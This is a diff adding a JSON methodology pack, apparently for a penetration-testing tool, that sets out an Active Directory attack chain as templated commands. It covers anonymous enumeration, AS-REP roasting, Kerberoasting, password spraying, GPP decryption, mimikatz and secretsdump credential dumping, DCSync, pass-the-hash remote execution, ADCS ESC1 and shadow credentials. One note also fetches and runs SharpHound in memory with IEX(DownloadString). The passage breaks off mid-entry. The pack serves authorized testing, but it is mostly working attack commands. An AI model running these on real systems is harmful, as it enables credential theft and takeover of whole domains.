@@ -1,0 +1,1740 @@
+{
+ "id": "orange_ad_2025_03",
+ "title": "Active Directory (Orange Cyberdefense 2025.03)",
+ "source": "Orange Cyberdefense ocd-mindmaps AD 2025.03",
+ "upstream_commit": "6d16ca0d1434875e0617f2f3cfa825fad0bc7d7e",
+ "license": "GPL-3.0 (methodology data); see obol/packs/NOTICE.md",
+ "actions": [
+  {
+   "id": "ad-dc-identify",
+   "title": "Identify the Domain Controller and Domain",
+   "hypothesis": "A domain controller has a recognizable service fingerprint: Kerberos (88), LDAP (389/636), SMB (445), often DNS (53) and global catalog (3268). Before any AD technique works you need three facts: which host is the DC, the domain name, and the base DN. SMB banners disclose the domain with zero authentication.",
+   "tool": "nxc",
+   "tools": [
+    "nxc",
+    "nslookup",
+    "nmap"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "port:88",
+    "port:389",
+    "port:445"
+   ],
+   "produces": [
+    "ad.dc_candidate",
+    "ad.domain_known",
+    "kerberos.reachable",
+    "ldap.reachable",
+    "smb.reachable"
+   ],
+   "priority": 50,
+   "proves": "establishes a domain-controller candidate, the domain, kerberos.reachable, ldap.reachable, smb.reachable",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Domain Controller Identified",
+    "severity": "informational"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}}",
+     "note": "The banner line discloses domain and hostname, unauthenticated."
+    },
+    {
+     "tool": "nslookup",
+     "run": "nslookup -type=SRV _ldap._tcp.dc._msdcs.{{domain}}",
+     "note": "SRV records confirm which host is a DC. Skip if no domain known yet."
+    },
+    {
+     "tool": "nmap",
+     "run": "nmap -p 88,135,139,389,445,636,3268,5985 -sV {{target}}",
+     "note": "The DC-shaped port combination. 88+389+445 together is near-certain."
+    }
+   ]
+  },
+  {
+   "id": "ad-anon-ldap-enum",
+   "title": "Anonymous LDAP Enumeration",
+   "hypothesis": "Many lab DCs allow anonymous LDAP binds. An anonymous bind can expose the base DN and sometimes the entire user and group directory — including description fields, which admins notoriously use to store passwords and hints. Highest-value zero-credential move against a DC.",
+   "tool": "ldapsearch",
+   "tools": [
+    "ldapsearch",
+    "nxc",
+    "windapsearch"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "ldap.reachable",
+    "port:389"
+   ],
+   "produces": [
+    "ad.base_dn",
+    "ad.user_list",
+    "ad.anonymous_bind"
+   ],
+   "priority": 50,
+   "proves": "establishes the LDAP base DN, a domain user list, anonymous LDAP bind",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Anonymous LDAP Bind Permitted",
+    "severity": "medium"
+   },
+   "refs": [
+    "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u '' -p '' --users",
+     "note": "nxc does the whole anonymous LDAP pull in one line — users with descriptions included. On Forest-style boxes this is the fastest user list you will ever get."
+    },
+    {
+     "tool": "ldapsearch",
+     "run": "ldapsearch -x -H ldap://{{target}} -s base namingcontexts",
+     "note": "Anonymous bind test. If this returns naming contexts, the bind is allowed."
+    },
+    {
+     "tool": "ldapsearch",
+     "run": "ldapsearch -x -H ldap://{{target}} -b '{{base_dn}}' '(objectClass=user)' sAMAccountName description",
+     "note": "Pull usernames AND descriptions. Read every description — lab authors hide things there."
+    },
+    {
+     "tool": "ldapsearch",
+     "run": "ldapsearch -x -H ldap://{{target}} -b '{{base_dn}}' '(objectClass=group)' cn member",
+     "note": "Group membership reveals admin and service accounts worth targeting later."
+    },
+    {
+     "tool": "windapsearch",
+     "run": "windapsearch.py -d {{domain}} --dc-ip {{target}} -U",
+     "note": "Friendlier wrapper: -U dumps all user objects with their UPNs (mail-style names reveal the naming convention). Anonymous bind attempted automatically when no creds are given."
+    },
+    {
+     "tool": "windapsearch",
+     "run": "windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*'",
+     "note": "Dump EVERY object — OUs, groups, computers, service accounts. Service-account names (svc-*) are AS-REP-roast candidates; Exchange security groups in the output tell you Exchange is installed (see writedacl-dcsync)."
+    },
+    {
+     "tool": "sh",
+     "run": "nxc ldap {{target}} -u '' -p '' --users | awk '{print $5}' | grep -vE '^-Username|^\\[|^SM_|^HealthMailbox|\\$$' | sort -u > users.txt",
+     "note": "HANDOFF — distill the nxc table into a clean userlist (column 5 is the username; verify with head first, nxc versions shift columns). Drops headers, machine accounts ($), and system mailboxes. Then set the sidebar userlist to this file: kerbrute, spraying, and roasting all consume it."
+    }
+   ]
+  },
+  {
+   "id": "ad-user-enum",
+   "title": "User Enumeration (Kerberos and RPC)",
+   "hypothesis": "Kerberos is a username oracle: the KDC answers differently for valid and invalid accounts. Null SMB sessions can also enumerate users via RPC on permissive DCs. A validated user list is the raw material for AS-REP roasting, Kerberoasting, and spraying — most AD attacks start here.",
+   "tool": "kerbrute",
+   "tools": [
+    "kerbrute",
+    "enum4linux",
+    "rpcclient",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "kerberos.reachable",
+    "smb.reachable",
+    "port:88",
+    "port:445"
+   ],
+   "produces": [
+    "ad.user_list"
+   ],
+   "priority": 50,
+   "proves": "establishes a domain user list",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Domain User Enumeration Without Credentials",
+    "severity": "low"
+   },
+   "refs": [
+    "https://github.com/ropnop/kerbrute"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u guest -p '' --rid-brute",
+     "note": "RID cycling through a null/guest session — full user list with no creds and no Kerberos noise. Try guest first, then '' ''."
+    },
+    {
+     "tool": "kerbrute",
+     "run": "kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}}",
+     "note": "Fast and relatively quiet. Valid users return no error or a pre-auth demand."
+    },
+    {
+     "tool": "enum4linux",
+     "run": "enum4linux -U {{target}}",
+     "note": "Null-session RPC user enumeration."
+    },
+    {
+     "tool": "rpcclient",
+     "run": "rpcclient -U '' -N {{target}} -c 'enumdomusers'",
+     "note": "Manual null-session equivalent."
+    },
+    {
+     "tool": "sh",
+     "run": "kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}} -o kerb-valid.txt && grep VALID kerb-valid.txt | awk '{print $NF}' | cut -d@ -f1 | sort -u > users.txt",
+     "note": "HANDOFF — kerbrute output to clean users.txt. rpcclient variant: pipe enumdomusers through grep user: | cut -d[ -f2 | cut -d] -f1 | sort -u. Set the sidebar userlist to the result."
+    }
+   ]
+  },
+  {
+   "id": "asrep-roast",
+   "title": "AS-REP Roasting",
+   "hypothesis": "Accounts with DONT_REQUIRE_PREAUTH skip Kerberos pre-authentication: anyone can request an AS-REP, and part of the reply is encrypted with the account password hash. Request it, take it offline, crack it. No credentials needed — only a valid username. One weak password on one misconfigured account is a foothold.",
+   "tool": "impacket-GetNPUsers",
+   "tools": [
+    "impacket-GetNPUsers",
+    "hashcat",
+    "Rubeus"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "ad.user_list"
+   ],
+   "requires_any": [
+    "kerberos.reachable",
+    "port:88"
+   ],
+   "produces": [
+    "hash.asrep",
+    "credential.candidate"
+   ],
+   "priority": 74,
+   "proves": "establishes an AS-REP hash, candidate credentials",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "AS-REP Roastable Accounts (DONT_REQUIRE_PREAUTH)",
+    "severity": "medium"
+   },
+   "refs": [
+    "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html",
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{userlist}} -p '' --asreproast {{hashfile}}",
+     "note": "PREFERRED: zero creds — every user in the list is tried, roastable ones land in {{hashfile}} ready for hashcat -m 18200. This is the fastest Forest-style entry: anonymous LDAP gave you the list, this cashes it in."
+    },
+    {
+     "tool": "Rubeus",
+     "run": ".\\Rubeus.exe asreproast /format:hashcat /outfile:{{hashfile}}",
+     "note": "Enumerates DONT_REQUIRE_PREAUTH accounts and roasts them in one shot. /format:john also works."
+    },
+    {
+     "tool": "impacket-GetNPUsers",
+     "run": "impacket-GetNPUsers {{domain}}/ -usersfile {{userlist}} -dc-ip {{target}} -no-pass -outputfile {{hashfile}}",
+     "note": "Bulk roast: every pre-auth-disabled account in your user list yields a $krb5asrep$23$ hash."
+    },
+    {
+     "tool": "impacket-GetNPUsers",
+     "run": "impacket-GetNPUsers {{domain}}/{{user}} -dc-ip {{target}} -no-pass",
+     "note": "Single-user variant — when enum already fingered one suspect service account (svc-*), skip the list. Prints the hash to stdout; save it to {{hashfile}}."
+    },
+    {
+     "tool": "hashcat",
+     "run": "hashcat -m 18200 {{hashfile}} {{wordlist}}",
+     "note": "Mode 18200. Run locally; rockyou + best64 rules is the usual lab answer."
+    },
+    {
+     "tool": "john",
+     "run": "john {{hashfile}} --fork=4 -w={{wordlist}}",
+     "note": "John detects krb5asrep automatically — the zero-mode-lookup path. john {{hashfile}} --show to review."
+    },
+    {
+     "tool": "sh",
+     "run": "sort -u {{hashfile}} > asrep-clean.txt && wc -l asrep-clean.txt",
+     "note": "HANDOFF — dedupe before cracking; duplicates just burn GPU. Then hashcat -m 18200 asrep-clean.txt {{wordlist}}."
+    }
+   ]
+  },
+  {
+   "id": "gpp-passwords",
+   "title": "GPP Passwords in SYSVOL",
+   "hypothesis": "Legacy Group Policy Preferences stored local-account passwords in XML files in SYSVOL — a share any domain user (and sometimes anonymous sessions) can read. The cpassword value is AES-encrypted with a key Microsoft published in 2012, making it effectively plaintext. SYSVOL often also holds scripts and configs with other secrets.",
+   "tool": "smbclient",
+   "tools": [
+    "smbclient",
+    "gpp-decrypt",
+    "smbmap"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "smb.reachable",
+    "port:445"
+   ],
+   "produces": [
+    "credential.candidate",
+    "config.review"
+   ],
+   "priority": 74,
+   "proves": "establishes candidate credentials, config.review",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "Credentials Recoverable from SYSVOL Group Policy Preferences",
+    "severity": "high"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "smbclient",
+     "run": "smbclient '//{{target}}/SYSVOL' -N -c 'recurse; ls'",
+     "note": "Anonymous SYSVOL listing. Hunt for Groups.xml, ScheduledTasks.xml, Services.xml under Policies."
+    },
+    {
+     "tool": "gpp-decrypt",
+     "run": "gpp-decrypt {{hash}}",
+     "note": "Paste the cpassword value as the parameter. The published AES key makes this instant."
+    }
+   ]
+  },
+  {
+   "id": "kerberoast",
+   "title": "Kerberoasting",
+   "hypothesis": "Any domain user can request service tickets (TGS) for accounts with SPNs — typically service accounts — and the ticket is encrypted with the service account password hash. Request them all, crack offline. Service accounts often have weak passwords and excessive rights, which is why this is the classic first move after any domain credential.",
+   "tool": "impacket-GetUserSPNs",
+   "tools": [
+    "impacket-GetUserSPNs",
+    "targetedKerberoast",
+    "hashcat",
+    "Rubeus"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "kerberos.reachable",
+    "port:88"
+   ],
+   "produces": [
+    "hash.tgs",
+    "credential.candidate"
+   ],
+   "priority": 78,
+   "proves": "establishes a TGS (Kerberoast) hash, candidate credentials",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "Kerberoastable Service Accounts",
+    "severity": "medium"
+   },
+   "refs": [
+    "https://github.com/fortra/impacket",
+    "https://github.com/GhostPack/Rubeus",
+    "https://github.com/ShutdownRepo/targetedKerberoast"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --kerberoasting {{hashfile}}",
+     "note": "PREFERRED: one line roasts every SPN account straight to a hashcat-13100-formatted file. -H {{hash}} works if you only have the NTLM."
+    },
+    {
+     "tool": "Rubeus",
+     "run": ".\\Rubeus.exe kerberoast /outfile:{{hashfile}}",
+     "note": "Roasts every SPN account using your current session — no password on the command line. Exfil {{hashfile}} and crack with the hashcat line."
+    },
+    {
+     "tool": "impacket-GetUserSPNs",
+     "run": "impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{target}} -request -outputfile {{hashfile}}",
+     "note": "Requests tickets for every SPN-bearing account; crackable ones come back as $krb5tgs$23$."
+    },
+    {
+     "tool": "hashcat",
+     "run": "hashcat -m 13100 {{hashfile}} {{wordlist}}",
+     "note": "Mode 13100. Service-account passwords are often old and weak."
+    },
+    {
+     "tool": "targetedKerberoast",
+     "run": "targetedKerberoast.py -d {{domain}} -u {{user}} -p {{password}} --dc-ip {{target}}",
+     "note": "0xdf favorite for privilege escalation: roasts only accounts YOU can write to (GenericAll/GenericWrite), sets a temporary SPN, requests the ticket, then cleans up. No pre-existing SPN needed."
+    },
+    {
+     "tool": "sh",
+     "run": "grep -h '\\$krb5tgs\\$' {{hashfile}} | sort -u > tgs-clean.txt && wc -l tgs-clean.txt",
+     "note": "HANDOFF — dedupe the roast file (nxc/impacket append on re-runs), then hashcat -m 13100 tgs-clean.txt {{wordlist}}. Sidebar hashfile should point at the source file."
+    }
+   ]
+  },
+  {
+   "id": "password-spray",
+   "title": "Password Spraying (Careful)",
+   "hypothesis": "Spraying tries ONE password against MANY accounts — the inverse of brute force, designed to stay under lockout thresholds. Seasonal passwords (Summer2026!), company name variants, and Password1 catch accounts everywhere. But lockout policies are real: check the policy first, budget your attempts, and go slow.",
+   "tool": "nxc",
+   "tools": [
+    "nxc",
+    "sprayhound"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "ad.user_list"
+   ],
+   "requires_any": [],
+   "produces": [
+    "credential.available"
+   ],
+   "priority": 88,
+   "proves": "establishes a usable credential",
+   "does_not_prove": "a usable credential — not access until it authenticates against a service",
+   "report": {
+    "finding": "Weak Domain Password (Password Spray)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/netexec-community/nxc",
+    "https://github.com/ropnop/kerbrute"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u '' -p '' --pass-pol",
+     "note": "Get the lockout policy BEFORE spraying. Lockout threshold minus one is your per-window budget."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{userlist}} -p {{password}}",
+     "note": "One password, all users — nxc dedups targets and resumes cleanly. Wait out the observation window between passwords."
+    },
+    {
+     "tool": "sprayhound",
+     "run": "sprayhound -U {{userlist}} -d {{domain}} -dc {{target}}",
+     "note": "Kerberos-based spray; integrates with BloodHound data."
+    },
+    {
+     "tool": "powershell",
+     "run": "Import-Module .\\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue",
+     "note": "From a Windows foothold instead of Kali: DomainPasswordSpray (dafthack). It auto-builds the user list from AD, skips accounts near lockout, and writes hits to a file. Change Welcome1 to your candidate."
+    }
+   ]
+  },
+  {
+   "id": "bloodhound-collect",
+   "title": "BloodHound Collection & Analysis",
+   "hypothesis": "AD environments are graphs: users, groups, sessions, ACLs, delegation. A graph maps attack paths no manual browsing would reveal — but every edge in that graph is also answerable with direct LDAP queries, which is the fallback when you cannot or will not run a collector.",
+   "tool": "bloodhound-python",
+   "tools": [
+    "bloodhound-python",
+    "bloodhound",
+    "SharpHound",
+    "powerview",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [],
+   "produces": [
+    "ad.graph.collected",
+    "ad.attack_paths"
+   ],
+   "priority": 84,
+   "proves": "establishes the AD graph, attack paths",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Active Directory Attack Paths Identified",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/SpecterOps/BloodHound",
+    "https://github.com/dirkjanm/BloodHound.py",
+    "https://github.com/SpecterOps/SharpHound",
+    "https://github.com/PowerShellMafia/PowerSploit"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --bloodhound -c All --dns-server {{target}}",
+     "note": "Collects everything and writes BloodHound-ready zips. Through a SOCKS tunnel add --dns-tcp. Then: ingest into BloodHound CE for the graph, or Boxes → Ingest BloodHound here for an instant findings readout."
+    },
+    {
+     "tool": "bloodhound-python",
+     "run": "bloodhound-python -d {{domain}} -u {{user}} -p '{{password}}' -ns {{target}} -c All --zip",
+     "note": "Full remote collection. Output zips are your evidence — ingest into BloodHound CE."
+    },
+    {
+     "tool": "bloodhound",
+     "run": "bloodhound",
+     "note": "Start the GUI, import the zips, and run: Shortest Paths to Domain Admins, plus the Kerberoastable and AS-REP roastable built-ins."
+    },
+    {
+     "tool": "SharpHound",
+     "run": "SharpHound.exe -c All --zipfilename bhloot",
+     "note": "From a domain beachhead (upload, or in-memory: IEX(DownloadString(.../SharpHound.ps1)); Invoke-BloodHound -CollectionMethod All). Exfil the zip and ingest into BloodHound on kali."
+    },
+    {
+     "tool": "bloodhound",
+     "run": "bloodhound",
+     "note": "Same GUI workflow as the remote variant — import the zip and read the prebuilt queries."
+    },
+    {
+     "tool": "net",
+     "run": "net user {{user}} /domain",
+     "note": "Direct group memberships of your user. And: net group \"Exchange Windows Permissions\" /domain lists members of any interesting group — swap the name."
+    },
+    {
+     "tool": "powerview",
+     "run": "Get-NetGroup -UserName {{user}}",
+     "note": "Upload PowerView.ps1 and dot-source it first (. .\\PowerView.ps1). This gives ALL groups the user belongs to, including nested — the answer the graph would give."
+    },
+    {
+     "tool": "powerview",
+     "run": "Get-DomainGroupMember \"Exchange Windows Permissions\" -Recurse",
+     "note": "Recursive member listing of any target group."
+    },
+    {
+     "tool": "powerview",
+     "run": "Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser {{user}}).objectsid}",
+     "note": "Every ACE your user holds. WriteDacl/GenericAll/WriteOwner on the domain object is the DCSync path — see the writedacl-dcsync card."
+    },
+    {
+     "tool": "powerview",
+     "run": "Get-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\"}",
+     "note": "The reverse question: who can already take over Domain Admins."
+    },
+    {
+     "tool": "powerview",
+     "run": "Find-LocalAdminAccess",
+     "note": "Machines where your user already has local admin — lateral movement targets without a session graph."
+    }
+   ]
+  },
+  {
+   "id": "dump-secrets",
+   "title": "Credential Dumping (Local and Domain)",
+   "hypothesis": "Admin access to a Windows host means its secrets: local SAM hashes, LSASS memory creds, cached logons. Admin access to a DC means the domain: NTDS.dit with every account hash. secretsdump does both — remotely over SMB with admin creds, or offline from extracted files.",
+   "tool": "impacket-secretsdump",
+   "tools": [
+    "impacket-secretsdump",
+    "nxc",
+    "mimikatz"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "access.admin",
+    "credential.admin"
+   ],
+   "produces": [
+    "hash.ntlm",
+    "credential.candidate",
+    "loot.ntds"
+   ],
+   "priority": 96,
+   "proves": "establishes NTLM hashes, candidate credentials, NTDS secrets",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "Domain Credential Dump",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --sam --lsa",
+     "note": "Local SAM hashes + LSA secrets (service passwords, cached creds) in one shot. -H {{hash}} for pass-the-hash. Point {{target}} at a subnet or targets file to loot every host at once — this is where nxc beats everything."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
+     "note": "ON A DC: the entire domain (every hash incl. krbtgt) via DRSUAPI — one line, no mimikatz. --ntds vss uses a shadow-copy snapshot instead if replication traffic is watched."
+    },
+    {
+     "tool": "mimikatz",
+     "run": "privilege::debug",
+     "note": "Elevate first, always."
+    },
+    {
+     "tool": "mimikatz",
+     "run": "sekurlsa::logonpasswords",
+     "note": "LSASS memory: plaintext + hashes for logged-on sessions. lsadump::sam for the local SAM instead."
+    },
+    {
+     "tool": "impacket-secretsdump",
+     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",
+     "note": "Remote dump of SAM/LSA/cached creds. Requires local admin on the target."
+    },
+    {
+     "tool": "impacket-secretsdump",
+     "run": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
+     "note": "Offline parse if you exfiltrated the registry hives instead."
+    },
+    {
+     "tool": "impacket-secretsdump",
+     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",
+     "note": "On a DC: pull one account from NTDS rather than the whole database."
+    }
+   ]
+  },
+  {
+   "id": "dcsync",
+   "title": "DCSync",
+   "hypothesis": "Accounts with replication rights (GetChanges + GetChangesAll — Domain Admins, and accounts granted them via ACL abuse) can ask a DC to replicate password data, no login to the DC required. This is the endgame for most AD paths: abuse ACLs to grant replication rights, then sync.",
+   "tool": "impacket-secretsdump",
+   "tools": [
+    "impacket-secretsdump",
+    "mimikatz",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "access.admin",
+    "ad.control_paths",
+    "credential.admin"
+   ],
+   "produces": [
+    "loot.ntds",
+    "hash.krbtgt"
+   ],
+   "priority": 96,
+   "proves": "establishes NTDS secrets, the krbtgt hash",
+   "does_not_prove": "crackable/reusable material — not a validated credential until cracked or validated",
+   "report": {
+    "finding": "Domain Replication Rights Abuse (DCSync)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/gentilkiwi/mimikatz",
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
+     "note": "PREFERRED cash-in: nxc runs the same DRSUAPI replication with a fraction of the typing. Add --ntds vss for the shadow-copy method. krbtgt in the output = golden-ticket material."
+    },
+    {
+     "tool": "mimikatz",
+     "run": "lsadump::dcsync /domain:{{domain}} /user:{{domain}}\\administrator",
+     "note": "Replicates one account from a Windows session. /all instead of /user for the full database. The mimikatz session must run as the rights-holding user (pth-spawned shell or token impersonation)."
+    },
+    {
+     "tool": "impacket-secretsdump",
+     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",
+     "note": "Replication-based pull of a single account."
+    },
+    {
+     "tool": "impacket-secretsdump",
+     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",
+     "note": "Full sync: every hash in the domain, including krbtgt (golden ticket material). Keep this file safe; it IS the report evidence."
+    }
+   ]
+  },
+  {
+   "id": "lateral-exec",
+   "title": "Authenticated Remote Execution",
+   "hypothesis": "Valid credentials with local admin rights give you execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM via evil-winrm (full shell, port 5985). With only an NTLM hash, pass-the-hash works the same — you rarely need the plaintext at all.",
+   "tool": "evil-winrm",
+   "tools": [
+    "evil-winrm",
+    "impacket-psexec",
+    "impacket-wmiexec",
+    "powershell",
+    "PsExec",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "credential.available",
+    "hash.ntlm"
+   ],
+   "produces": [
+    "foothold.windows",
+    "access.admin"
+   ],
+   "priority": 92,
+   "proves": "establishes a Windows foothold, administrative access",
+   "does_not_prove": "administrative access in this host/context — not domain dominance unless separately proven",
+   "report": {
+    "finding": "Lateral Movement via Exposed Credentials",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/fortra/impacket",
+    "https://github.com/netexec-community/nxc",
+    "https://lolbas-project.github.io/"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p '{{password}}'",
+     "note": "First: validate the cred and see what is pwned. Swap {{target}} for a subnet (10.10.11.0/24) or a targets file to check EVERY host at once — [+] means valid, Pwn3d! means local admin."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -x 'whoami'",
+     "note": "Run any command WITHOUT logging in — execution via WMI by default (no service dropped). Chain what you need: dump files, add users, stage payloads."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -X 'whoami'",
+     "note": "WinRM flavor of the same trick — no SMB service artifacts at all, output returns over 5985."
+    },
+    {
+     "tool": "powershell",
+     "run": "Enter-PSSession -ComputerName {{target}} -Credential $cred",
+     "note": "Native PSRemoting — build $cred with PSCredential (see the writedacl-dcsync card), or run from a pth-spawned shell to skip creds entirely."
+    },
+    {
+     "tool": "psexec",
+     "run": ".\\PsExec.exe \\\\{{target}} cmd",
+     "note": "Sysinternals PsExec from Windows rides your current logon or injected hash context — no password on the command line."
+    },
+    {
+     "tool": "evil-winrm",
+     "run": "evil-winrm -i {{target}} -u {{user}} -p '{{password}}'",
+     "note": "Best interactive experience when 5985/5986 is open. -H for hash auth."
+    },
+    {
+     "tool": "impacket-psexec",
+     "run": "impacket-psexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+     "note": "Service-based SYSTEM shell. Loud but reliable."
+    },
+    {
+     "tool": "impacket-psexec",
+     "run": "impacket-psexec -hashes ':{{hash}}' {{user}}@{{target}}",
+     "note": "Pass-the-hash variant — no plaintext needed."
+    },
+    {
+     "tool": "impacket-wmiexec",
+     "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+     "note": "Quieter; no service created."
+    }
+   ]
+  },
+  {
+   "id": "adcs-esc",
+   "title": "ADCS Misconfiguration Abuse (ESC1-8)",
+   "hypothesis": "Active Directory Certificate Services with vulnerable templates lets ordinary users request certificates for ANY identity (ESC1: client-auth template + enrollment rights + enrollee supplies subject). A certificate is a credential: authenticate as Domain Admin with it. certipy finds the misconfigs; the same tool does the request and the auth.",
+   "tool": "certipy",
+   "tools": [
+    "certipy"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [],
+   "produces": [
+    "adcs.vulnerable",
+    "credential.certificate"
+   ],
+   "priority": 78,
+   "proves": "establishes a vulnerable ADCS template, certificate material",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "ADCS Template Misconfiguration",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+    "https://github.com/ly4k/Certipy",
+    "https://github.com/GhostPack/Certify"
+   ],
+   "commands": [
+    {
+     "tool": "certipy",
+     "run": "certipy find -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -vulnerable",
+     "note": "Enumerate templates and CAs; -vulnerable filters to exploitable configs. Read the output carefully — it names the ESC number."
+    },
+    {
+     "tool": "certipy",
+     "run": "certipy req -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca {{ca_name}} -template {{template}} -upn administrator@{{domain}}",
+     "note": "ESC1: request a cert as Administrator. Requires the CA and template names from find."
+    },
+    {
+     "tool": "certipy",
+     "run": "certipy auth -pfx administrator.pfx -dc-ip {{target}}",
+     "note": "Authenticate with the certificate; returns a TGT and the NTLM hash."
+    }
+   ]
+  },
+  {
+   "id": "shadow-credentials",
+   "title": "Shadow Credentials",
+   "hypothesis": "If you have GenericWrite over a computer or user object (from ACL abuse or a relay), you can write a key to its msDS-KeyCredentialLink attribute and then authenticate as that object with the certificate you just added. Requires ADCS present (2016+ DC functional level). Silent, and the target object never logs a password change.",
+   "tool": "pywhisker",
+   "tools": [
+    "pywhisker",
+    "certipy"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "ad.control_paths",
+    "relay.success"
+   ],
+   "produces": [
+    "credential.certificate"
+   ],
+   "priority": 78,
+   "proves": "establishes certificate material",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Shadow Credentials via Object Write Access",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/ShutdownRepo/pywhisker",
+    "https://github.com/GhostPack/Whisker"
+   ],
+   "commands": [
+    {
+     "tool": "pywhisker",
+     "run": "pywhisker.py -d {{domain}} -u {{user}} -p {{password}} --target {{target_sam}} --action list",
+     "note": "List existing key credentials first — verify your write access theory."
+    },
+    {
+     "tool": "pywhisker",
+     "run": "pywhisker.py -d {{domain}} -u {{user}} -p {{password}} --target {{target_sam}} --action add",
+     "note": "Adds your key. Then auth with the generated PFX via certipy or Rubeus asktgt /certificate."
+    }
+   ]
+  },
+  {
+   "id": "delegation-abuse",
+   "title": "Kerberos Delegation Abuse",
+   "hypothesis": "Delegation lets services impersonate users. Unconstrained delegation: a host caches TGTs of everyone who connects — coerce the DC to connect to it (PetitPotam) and you hold the DC TGT. Constrained/RBCD: abuse write access to set msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate anyone to the target service.",
+   "tool": "rubeus",
+   "tools": [
+    "rubeus",
+    "impacket-addcomputer",
+    "impacket-rbcd",
+    "impacket-getST"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "access.admin",
